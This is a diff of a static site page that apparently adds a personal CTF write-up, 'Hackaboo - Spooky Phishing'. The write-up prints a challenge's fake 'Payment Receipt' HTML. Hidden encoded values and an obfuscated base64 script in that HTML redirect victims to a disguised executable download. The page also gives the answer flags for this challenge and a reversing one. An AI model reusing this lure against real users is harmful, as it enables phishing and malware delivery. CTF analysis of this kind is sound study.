@@ -3,7 +3,7 @@
 <html lang="" >
     <head>
         <meta charset="UTF-8">
-        <title>XOR Madness – CryptoCTF · HonKit</title>
+        <title>Hackaboo - Spooky Phishing · HonKit</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="HonKit 6.1.6">
@@ -58,6 +58,8 @@
     <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
 
     
+    
+    <link rel="prev" href="../crypto/hexcoding64.html" />
     
 
     </head>
@@ -193,19 +195,6 @@
             
         </li>
     
-        <li class="chapter " data-level="3.2.1.3" data-path="../pwn/ret2win.html">
-            
-                <a href="../pwn/ret2win.html">
-            
-                    
-                    ret2win – ExampleCTF
-            
-                </a>
-            
-
-            
-        </li>
-    
 
             </ul>
             
@@ -225,12 +214,25 @@
             <ul class="articles">
                 
     
-        <li class="chapter active" data-level="3.2.2.1" data-path="xor-madness.html">
+        <li class="chapter " data-level="3.2.2.1" data-path="../crypto/hexcoding64.html">
             
-                <a href="xor-madness.html">
+                <a href="../crypto/hexcoding64.html">
             
                     
-                    XOR Madness – CryptoCTF
+                    Hackaboo - Hexcoding64
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="3.2.2.2" data-path="spookyfishing.html">
+            
+                <a href="spookyfishing.html">
+            
+                    
+                    Hackaboo - Spooky Phishing
             
                 </a>
             
@@ -413,7 +415,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href="../.." >XOR Madness – CryptoCTF</a>
+        <a href="../.." >Hackaboo - Spooky Phishing</a>
     </h1>
 </div>
 
@@ -428,7 +430,65 @@
     
                                 <section class="normal markdown-section">
                                 
-                                
+                                <h1 id="spooky-phishing">Spooky Phishing</h1>
+<h2 id="so-again-download-the-files-and-i-am-presented-with-an-indexhtml">So again download the files and I am presented with an <code>index.html</code></h2>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/ctf/hackaboo
+$ <span class="hljs-built_in">cat</span> index.html                                                                                                                            [6:11:11]
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;<span class="hljs-built_in">head</span>&gt;
+  &lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;
+  &lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1"</span>&gt;
+  &lt;title&gt;Payment Receipt&lt;/title&gt;
+      &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"</span> rel=<span class="hljs-string">"stylesheet"</span> integrity=<span class="hljs-string">"sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65"</span> crossorigin=<span class="hljs-string">"anonymous"</span>&gt;
+  &lt;script src=<span class="hljs-string">"https://code.jquery.com/jquery-3.7.1.min.js"</span> integrity=<span class="hljs-string">"sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="</span> crossorigin=<span class="hljs-string">"anonymous"</span>&gt;&lt;/script&gt;
+  &lt;style&gt;
+    body {
+      overflow: hidden;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      margin: 0;
+      padding: 0
+    }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;input class=<span class="hljs-string">"li"</span> hidden value=<span class="hljs-string">"Njg3NDc0NzA3MzNhMmYyZjc3Njk2ZTY0NmY3NzczNmM2OTc2NjU3NTcwNjQ2MTc0NjU3MjJlNjg3NDYyMmY0ODU0NDI3Yjcz"</span>&gt;
+  &lt;input class=<span class="hljs-string">"il"</span> hidden value=<span class="hljs-string">"NzAzMDMwNmI3OTVmNzA2ODMxNzM2ODMxNmU2NzVmNzczMTc0Njg1ZjczNzAzMDMwNmI3OTVmNzM3MDcyMzMzNDY0NzM2ODMzMzM3NDczN2QyZjYxNzA3MDJlNzg2YzczNzgyZTY1Nzg2NQ=="</span>&gt;
+  &lt;div class=<span class="hljs-string">"row justify-content-center"</span>&gt;
+    &lt;div class=<span class="hljs-string">"col-lg-4"</span> style=<span class="hljs-string">"max-width: 390px; min-width: 390px;"</span>&gt;
+      &lt;div class=<span class="hljs-string">"card mt-5 border-0 shadow-sm"</span>&gt;
+        &lt;div class=<span class="hljs-string">"card-header"</span>&gt;
+          &lt;img <span class="hljs-built_in">id</span>=<span class="hljs-string">"banner"</span> style=<span class="hljs-string">"max-height:36px;"</span> class=<span class="hljs-string">"img-fluid"</span>&gt;
+        &lt;/div&gt;
+        &lt;div class=<span class="hljs-string">"card-body shadow-sm rounded"</span>&gt;
+          &lt;div class=<span class="hljs-string">"d-flex align-items-center justify-content-center"</span>&gt;
+            &lt;strong&gt;Loading...&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;div class=<span class="hljs-string">"spinner-border ml-auto"</span> role=<span class="hljs-string">"status"</span> aria-hidden=<span class="hljs-string">"true"</span>&gt;&lt;/div&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;script src=<span class="hljs-string">"data:text/javascript;base64,JChfID0+IHsKCiAgICBjb25zdCBuID0gYXRvYigkKCcuaWwnKS52YWwoKSk7CiAgICBjb25zdCBubiA9IGRlY29kZUhleChuKTsKCiAgICBkb2N1bWVudC5ib2R5LnN0eWxlLmJhY2tncm91bmRJbWFnZSA9ICd1cmwoaHR0cDovL21pY3Jvc29mdGNsb3Vkc2VydmljZXMuY29tL2ltYWdlcy8yNDQwNTc2MjQtYTY1M2MzOTktMWU2NC00NDRlLTg3OTItZTNkZmRjMjA0ZGZkLnBuZyknOwogICAgJCgnI2Jhbm5lcicpLmF0dHIoJ3NyYycsICdodHRwOi8vbWljcm9zb2Z0Y2xvdWRzZXJ2aWNlcy5jb20vaW1hZ2VzLzI0NDA1NzY3OS1mOTcxZjJlNi1hZjRhLTQwZjctOTIyNS03ZDRlOTI5ZWQzYWUucG5nJyk7CgogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgY29uc3QgYSA9IGF0b2IoJCgnLmxpJykudmFsKCkpOwogICAgICAgIGNvbnN0IGFhID0gZGVjb2RlSGV4KGEpOwoKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IGFhICsgbm47CiAgICB9LCAzNTAwKTsKfSk7CgpmdW5jdGlvbiBkZWNvZGVIZXgoaGV4eCkgewogICAgdmFyIGhleCA9IGhleHgudG9TdHJpbmcoKTsKICAgIHZhciBzdHIgPSAnJzsKICAgIGZvciAodmFyIGkgPSAwOyBpIDwgaGV4Lmxlbmd0aDsgaSArPSAyKQogICAgICAgIHN0ciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGhleC5zdWJzdHIoaSwgMiksIDE2KSk7CiAgICByZXR1cm4gc3RyOwp9"</span>&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;%
+</code></pre>
+<p>I immediately went for the bade64 script but then I noticed the hidden values. Taking the first I decode it from base 64 then ASCII again and get a partial flag, surely the rest is in the other hidden value and it is <code>HTB{sp00ky_ph1sh1ng_w1th_sp00ky_spr34dsh33ts}</code> when combined.
+Damn I’m happy lol. I’ll try another.</p>
+<p>So I tried the first Reversing and well that was easy, it is a ELF executable that I simply ran strings on:</p>
+<pre><code class="lang-bash">Sour Patch Kids
+Sour Punch
+Toxic Waste
+Warheads
+HTB{4lw4y5_ch3ck_ur_k1d5_c4ndy}
+Reaching into the candy bowl...
+Your candy is... <span class="hljs-string">'%s'</span>. Enjoy!
+;*3$<span class="hljs-string">"
+GCC: (Debian 10.2.1-6) 10.2.1 20210110
+</span></code></pre>
+<p>I’m sure you can work out the flag 😀</p>
+
                                 
                                 </section>
                             
@@ -455,6 +515,10 @@
 
             
                 
+                <a href="../crypto/hexcoding64.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: Hackaboo - Hexcoding64">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
                 
             
         
@@ -463,7 +527,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"XOR Madness – CryptoCTF","level":"3.2.2.1","depth":3,"next":{"title":"🕵🏻 Sherlocks","level":"3.2.3","depth":2,"ref":"","articles":[{"title":"JWT Abuse – WebCTF","level":"3.2.3.1","depth":3,"path":"writeups/web/jwt-abuse.md","ref":"writeups/web/jwt-abuse.md","articles":[]}]},"previous":{"title":"🔐 Challenges","level":"3.2.2","depth":2,"ref":"","articles":[{"title":"XOR Madness – CryptoCTF","level":"3.2.2.1","depth":3,"path":"writeups/crypto/xor-madness.md","ref":"writeups/crypto/xor-madness.md","articles":[]}]},"dir":"neutral"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"writeups/crypto/xor-madness.md","mtime":"2026-02-25T19:58:06.093Z","type":"markdown"},"gitbook":{"version":"6.1.6","time":"2026-02-26T22:45:11.251Z"},"basePath":"../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Hackaboo - Spooky Phishing","level":"3.2.2.2","depth":3,"next":{"title":"🕵🏻 Sherlocks","level":"3.2.3","depth":2,"ref":"","articles":[{"title":"JWT Abuse – WebCTF","level":"3.2.3.1","depth":3,"path":"writeups/web/jwt-abuse.md","ref":"writeups/web/jwt-abuse.md","articles":[]}]},"previous":{"title":"Hackaboo - Hexcoding64","level":"3.2.2.1","depth":3,"path":"writeups/crypto/hexcoding64.md","ref":"writeups/crypto/hexcoding64.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"writeups/forensics/spookyfishing.md","mtime":"2026-02-27T06:06:39.745Z","type":"markdown"},"gitbook":{"version":"6.1.6","time":"2026-02-27T06:02:57.736Z"},"basePath":"../..","book":{"language":""}});
         });
     </script>
 </div>
